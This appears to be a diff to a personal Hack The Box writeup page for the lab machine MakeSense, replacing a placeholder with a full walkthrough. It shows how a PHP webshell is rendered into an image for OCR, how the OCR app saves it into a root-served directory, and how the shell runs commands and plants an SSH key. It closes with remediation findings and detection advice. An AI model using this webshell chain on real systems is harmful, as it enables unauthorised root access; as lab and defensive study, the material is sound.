@@ -4,86 +4,224 @@
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <title>MakeSense — HTB Writeup (Lanky)</title>
-  <meta name="description" content="Hack The Box: MakeSense — rooted. Full writeup published after Season 11 closes.">
+  <meta name="description" content="Hack The Box: MakeSense — Medium Linux. An OCR web app running as root writes recognised text into its own served docroot, turning a picture of PHP into a root webshell. Plus a patched-by-backport CVE that looked like the answer and wasn't.">
   <link rel="stylesheet" href="../assets/style.css?v=5">
-  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'><text y='14' font-size='14'>&#127875;</text></svg>">
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'><text y='14' font-size='14'>&#128065;</text></svg>">
 </head>
 <body>
-  <div class="banner">
-    ◷ <strong>Active Season 11 box</strong> — full technical writeup publishes once the season closes. Summary &amp; lessons below.
-  </div>
-
   <header class="nav">
     <div class="wrap">
       <a class="brand" href="../index.html">lanky<span class="accent">.pwns</span></a>
-      <a class="link" href="../index.html">← all writeups</a>
+      <a class="link" href="../index.html#lab">← all writeups</a>
     </div>
   </header>
 
   <article class="wrap">
-    <a class="back" href="../index.html">back to portfolio</a>
+    <a class="back" href="../index.html#lab">back to writeups</a>
     <img class="wu-logo" src="../assets/logos/makesense.png" alt="MakeSense logo">
     <h1 style="margin-top:16px;">MakeSense</h1>
-    <div class="subtitle">Hack The Box · <a href="https://app.hackthebox.com/machines/MakeSense" target="_blank" rel="noopener">app.hackthebox.com/machines/MakeSense</a></div>
+    <div class="subtitle">Hack The Box · <a href="https://app.hackthebox.com/machines/MakeSense" target="_blank" rel="noopener">app.hackthebox.com/machines/MakeSense</a> · Season 11</div>
     <div class="machine-meta">
       <span class="pill os-linux">Linux</span>
       <span class="pill diff-medium">Medium</span>
       <span class="pill season">Season 11</span>
+      <span class="pill">OCR → file write</span>
+      <span class="pill">Root docroot</span>
+      <span class="pill flagp">User</span>
+      <span class="pill flagp">Root</span>
       <span class="pill rooted">● Completed</span>
-      <span class="pill pending">writeup after season</span>
     </div>
 
     <div class="callout">
-      <span class="tag">Summary</span>
-      User flag fell fast; root was the interesting part. The obvious lead — a package-manager service
-      whose version matched a recent high-severity local-privesc CVE — turned into a rabbit hole. The
-      real root cause was an <strong>access-control gap in a custom application</strong>: a low-privileged
-      account could write a file into a directory consumed by a process running as <strong>root</strong>.
-      No memory corruption, no race — just a broken trust boundary.
+      <span class="tag">TL;DR</span>
+      A box with a genuinely fun privilege escalation and a very instructive red herring. Root came from an
+      <strong>OCR web application running as root</strong> which saves recognised text into a directory it also
+      serves — so a <em>picture of PHP source code</em> becomes a root-executed webshell. The obvious-looking
+      route, <strong>PackageKit CVE-2026-41651</strong>, was a dead end: Ubuntu had backported the fix without
+      bumping the version string.
     </div>
 
-    <h2><span class="num">01</span>Why the full writeup is held back</h2>
+    <dl class="fact">
+      <dt>Target</dt><dd><b>makesense.htb</b></dd>
+      <dt>Host OS</dt><dd>Linux (Ubuntu)</dd>
+      <dt>Foothold</dt><dd>SSH as <code>walter</code> with supplied credentials</dd>
+      <dt>Privesc</dt><dd>OCR "save" writes <code>.php</code> into a root-served docroot</dd>
+      <dt>Red herring</dt><dd>PackageKit CVE-2026-41651 — patched via distro backport</dd>
+    </dl>
+
+    <h2><span class="num">01</span>Setup and foothold</h2>
+    <pre data-lang="bash"><code>grep makesense.htb /etc/hosts || echo "&lt;target&gt; makesense.htb" | sudo tee -a /etc/hosts
+curl -sk -I https://makesense.htb/ --resolve makesense.htb:443:&lt;target&gt;
+
+ssh walter@makesense.htb        # supplied credentials</code></pre>
+    <div class="flag"><span class="label">user.txt</span>&lt;redacted&gt;</div>
+
+    <h2><span class="num">02</span>The red herring — verify before you build</h2>
     <p>
-      MakeSense is a live <strong>Season 11</strong> machine. In line with Hack The Box's guidance on
-      active machines, I don't publish a step-by-step reproduction while it's still in play. The complete
-      writeup — recon, foothold, the CVE red-herring, the file-write-to-root vector, and remediation —
-      goes live here <strong>once the season closes</strong>.
+      The first thing local enumeration surfaces is PackageKit, and <code>pkcon --version</code> reports
+      <code>1.2.8</code> — squarely in range for <strong>CVE-2026-41651</strong> ("Pack2TheRoot"), a
+      deterministic TOCTOU that yields root. It is a named, high-CVSS bug with public exploit code. It is also
+      completely dead here.
+    </p>
+    <pre data-lang="bash"><code>apt-get changelog packagekit    # shows the backported security fix
+# pkcon --version still reports 1.2.8 — the version string does not move</code></pre>
+    <p>
+      Debian and Ubuntu backport security patches into the existing upstream version and bump only the distro
+      revision. Checking <code>--version</code> tells you almost nothing about whether a CVE applies. Checking
+      the <em>changelog</em> does. Five minutes here saved a long detour building an exploit chain that could
+      never have worked.
     </p>
 
-    <h2><span class="num">02</span>The interesting bit (no spoilers)</h2>
-    <h3>A CVE that looked like the answer — and wasn't</h3>
-    <p>
-      A service on the box matched a recently disclosed, high-severity local privilege-escalation CVE.
-      It looked like the intended path, so I invested time building and tuning an exploit. The catch: the
-      vendor's fix had been <strong>silently backported</strong> into the distro package without a version
-      bump — <code>--version</code> reported "vulnerable" while the changelog said otherwise. A good reminder
-      that a version string is a claim, not proof.
-    </p>
-    <h3>The bug that actually worked</h3>
-    <p>
-      Root came from a custom internal tool with a file-write flaw — an ordinary access-control gap letting
-      an unprivileged user drop a file where a root process would act on it. The "boring" class of bug
-      (file writes, path handling, service trust boundaries) doing what boring bugs do best.
-    </p>
-
-    <h2><span class="num">03</span>Takeaways</h2>
+    <h2><span class="num">03</span>Finding the real target</h2>
+    <pre data-lang="bash"><code>ps aux | grep -i "ocr4\|packagekit"
+# /bin/bash /root/.scripts/start_ocr4.sh
+# php -S 127.0.0.1:8001 -t /root/ocr4/        &lt;-- served as ROOT</code></pre>
+    <p>Three facts stack into the whole privilege escalation:</p>
     <ul>
-      <li>A CVE with a high CVSS and a catchy name isn't automatically the answer — <strong>verify the target is actually vulnerable</strong> before building around it.</li>
-      <li>Silent, backported fixes mean version numbers lie. Confirm with behaviour, not the changelog.</li>
-      <li>Access-control gaps and file-write bugs still account for a huge share of real-world privesc — worth as much attention as the flashy CVEs.</li>
-      <li>These are the same failure modes I chase from the defensive side day-to-day — which is exactly why I run the offensive labs.</li>
+      <li>PHP's built-in development server is running <strong>as root</strong>.</li>
+      <li>Its docroot is <code>/root/ocr4/</code>.</li>
+      <li>The application's "save" feature writes recognised OCR text to <code>saved/&lt;filename&gt;</code>
+        <em>inside that same docroot</em> — and the filename is user-supplied.</li>
+    </ul>
+    <p>
+      So anything saved as <code>.php</code> is served and executed by a root process. The input is OCR output,
+      which means the payload has to survive being <em>read out of an image</em>.
+    </p>
+
+    <h2><span class="num">04</span>Making OCR produce exact PHP</h2>
+    <p>
+      This is the part I enjoyed. Tesseract on ordinary rendered text mangles exactly the characters PHP needs —
+      <code>$</code>, <code>_</code>, <code>(</code>, <code>;</code>, <code>&lt;?</code>. The trick that worked
+      first try is to remove all the ambiguity OCR normally has to resolve: render <strong>one character at a
+      time, at fixed pitch, in a bold monospace face</strong>, so every glyph is isolated and unambiguous.
+    </p>
+    <pre data-lang="bash"><code>php -r '
+$text = "&lt;?php system(\$_GET[0]);";
+$chars = str_split($text);
+$fontsize = 42; $pitch = 34; $W = count($chars)*$pitch+60; $H = 180;
+$im = imagecreatetruecolor($W,$H);
+$white = imagecolorallocate($im,255,255,255); $black = imagecolorallocate($im,0,0,0);
+imagefilledrectangle($im,0,0,$W,$H,$white);
+$font = "/usr/share/fonts/truetype/dejavu/DejaVuSansMono-Bold.ttf"; $x = 30;
+foreach ($chars as $c){ imagettftext($im,$fontsize,0,$x,110,$black,$font,$c); $x += $pitch; }
+imagepng($im,"/tmp/shell.png");'
+
+tesseract /tmp/shell.png stdout    # must print EXACTLY: &lt;?php system($_GET[0]);</code></pre>
+    <p>
+      Verify the OCR output locally before sending anything. If <code>tesseract</code> does not reproduce the
+      string byte for byte on your own machine, it will not on theirs.
+    </p>
+
+    <h2><span class="num">05</span>Recognise, save, execute</h2>
+    <pre data-lang="bash"><code>JAR=/tmp/cjshell; rm -f "$JAR"
+
+# 1. submit the canvas image for recognition
+curl -s -c "$JAR" -b "$JAR" -u walter:'&lt;pass&gt;' -X POST http://127.0.0.1:8001/ \
+  --data-urlencode "canvas_image=data:image/png;base64,$(base64 -w0 /tmp/shell.png)" -o /tmp/rec.html
+
+OCRID=$(grep -oE 'ocr_[0-9a-f]+\.[0-9]+' /tmp/rec.html | head -1)
+sed -n '/&lt;p class="output-text"&gt;/,/&lt;\/p&gt;/p' /tmp/rec.html    # confirm the text came back clean
+
+# 2. save that recognition result as a .php file
+curl -s -c "$JAR" -b "$JAR" -u walter:'&lt;pass&gt;' -X POST http://127.0.0.1:8001/ \
+  --data-urlencode "ocr_id=$OCRID" --data-urlencode "filename=shell.php" \
+  --data-urlencode "save_output=Save" -o /tmp/save.html
+
+# 3. it is now served by the root php -S
+curl -s -u walter:'&lt;pass&gt;' "http://127.0.0.1:8001/saved/shell.php?0=id"
+# uid=0(root) gid=0(root) groups=0(root)</code></pre>
+    <pre data-lang="bash"><code>curl -s -u walter:'&lt;pass&gt;' "http://127.0.0.1:8001/saved/shell.php?0=cat+/root/root.txt"</code></pre>
+    <div class="flag"><span class="label">root.txt</span>&lt;redacted&gt;</div>
+    <p>For a stable shell rather than a query-string one, the webshell can drop an SSH key:</p>
+    <pre data-lang="bash"><code>PUBKEY=$(cat ~/.ssh/id_ed25519.pub)
+curl -s -u walter:'&lt;pass&gt;' -G "http://127.0.0.1:8001/saved/shell.php" \
+  --data-urlencode "0=mkdir -p /root/.ssh &amp;&amp; echo '$PUBKEY' &gt;&gt; /root/.ssh/authorized_keys &amp;&amp; chmod 700 /root/.ssh &amp;&amp; chmod 600 /root/.ssh/authorized_keys &amp;&amp; id"
+ssh -i ~/.ssh/id_ed25519 root@makesense.htb</code></pre>
+
+    <h2><span class="num">06</span>If this were your environment</h2>
+
+    <div class="finding">
+      <span class="tag">Finding 1 · Critical</span>
+      <h4>Root-run PHP development server serving a writable directory</h4>
+      <p>
+        <code>php -S</code> was running as root with a docroot that a lower-privileged application feature could
+        write arbitrary filenames into. Any <code>.php</code> written there executes as root — the OCR step is
+        just the delivery mechanism.
+      </p>
+    </div>
+    <div class="fix">
+      <span class="tag">How I would fix it</span>
+      <ul>
+        <li><strong>Never run <code>php -S</code> in production, and never as root.</strong> It is a development server; put the app behind php-fpm and a real web server under a dedicated service account.</li>
+        <li><strong>Never serve a directory that a lower-privileged feature can write to.</strong> That is the whole bug, independent of PHP.</li>
+        <li><strong>Run the service with systemd hardening</strong> — <code>User=</code>, <code>NoNewPrivileges=true</code>, <code>ProtectSystem=strict</code>, <code>ProtectHome=true</code>.</li>
+      </ul>
+      <div class="ctrl">
+        <b>NIST 800-53 r5:</b> AC-6 least privilege · CM-7 least functionality · CM-6 configuration settings · SC-2 separation of system and user functionality<br>
+        <b>CIS Controls v8:</b> 4.x secure configuration of enterprise assets and software
+      </div>
+    </div>
+
+    <div class="finding">
+      <span class="tag">Finding 2 · High</span>
+      <h4>A save/export feature that is really an arbitrary-file-write sink</h4>
+      <p>
+        The application accepted a user-supplied filename and wrote transformed content to it inside the served
+        tree. Extension, path and destination were all attacker-influenced.
+      </p>
+    </div>
+    <div class="fix">
+      <span class="tag">How I would fix it</span>
+      <ul>
+        <li><strong>Write outputs outside any served path</strong> and hand them back through a download handler rather than a URL into the docroot.</li>
+        <li><strong>Force a safe extension server-side</strong> (<code>.txt</code>) and generate the filename yourself; never trust a client-supplied name.</li>
+        <li><strong>Disable execution in upload/output directories</strong> as defence in depth (<code>php_admin_flag engine off</code>, or equivalent).</li>
+        <li><strong>Treat every "transform and save" feature as a code-execution sink</strong> during design review — OCR, image conversion, PDF export, report generation.</li>
+      </ul>
+      <div class="ctrl">
+        <b>NIST 800-53 r5:</b> SI-10 input validation · CM-7 least functionality · AC-3 access enforcement<br>
+        <b>CWE:</b> CWE-434 unrestricted upload of file with dangerous type · CWE-73 external control of file name or path
+      </div>
+    </div>
+
+    <div class="finding">
+      <span class="tag">Finding 3 · Informational</span>
+      <h4>Version strings are not patch status</h4>
+      <p>
+        PackageKit reported a version that matched a public CVE while the distro had already backported the fix.
+        Responding to the version alone would have produced a false positive in a report — and, on the offensive
+        side, wasted hours.
+      </p>
+    </div>
+    <div class="fix">
+      <span class="tag">How I would fix it</span>
+      <ul>
+        <li><strong>Verify against the distro changelog</strong> (<code>apt-get changelog</code>, <code>rpm -q --changelog</code>) or the vendor's security tracker, not <code>--version</code>.</li>
+        <li><strong>Configure scanners for backport awareness</strong>, or triage their output against the package revision, before raising findings.</li>
+      </ul>
+      <div class="ctrl">
+        <b>NIST 800-53 r5:</b> RA-5 vulnerability monitoring &amp; scanning · SI-2 flaw remediation
+      </div>
+    </div>
+
+    <h2><span class="num">07</span>Detection — the blue-team side</h2>
+    <ul>
+      <li><strong>New <code>.php</code> (or any executable content) appearing in a served directory</strong> — high signal, low noise.</li>
+      <li><strong>A root-owned process writing web-executable content</strong>, anywhere.</li>
+      <li><strong>OCR / transform output whose result is executable</strong>, or whose filename carries a code extension.</li>
+      <li><strong><code>php -S</code> present in a process list</strong> on a production host at all.</li>
     </ul>
 
-    <div class="callout todo">
-      <span class="tag">Coming after Season 11</span>
-      Full technical walkthrough with the exact chain, commands, and a remediation section.
-    </div>
+    <h2><span class="num">08</span>Takeaways</h2>
+    <ul>
+      <li><strong>A named, high-CVSS CVE is not automatically the answer.</strong> Verify it applies before you build around it — backports do not move version strings.</li>
+      <li><strong>The "boring" bugs drive most real privilege escalation:</strong> file writes and trust boundaries between two services that were each fine alone.</li>
+      <li><strong>The OCR trick generalises.</strong> Per-character fixed pitch in a bold monospace face beats any transform-to-file pipeline that has to recognise text — worth remembering well beyond this box.</li>
+    </ul>
 
-    <p style="margin-top:40px;"><a class="back" href="../index.html">back to portfolio</a></p>
+    <p style="margin-top:40px;"><a class="back" href="../index.html#lab">back to writeups</a></p>
   </article>
 
-  <footer>
-    <div class="wrap">MakeSense · completed · Lanky &nbsp;·&nbsp; <a href="../index.html">all writeups</a></div>
-  </footer>
+  <footer><div class="wrap">MakeSense · Season 11 · completed · Lanky &nbsp;·&nbsp; <a href="../index.html#lab">all writeups</a></div></footer>
 </body>
 </html>
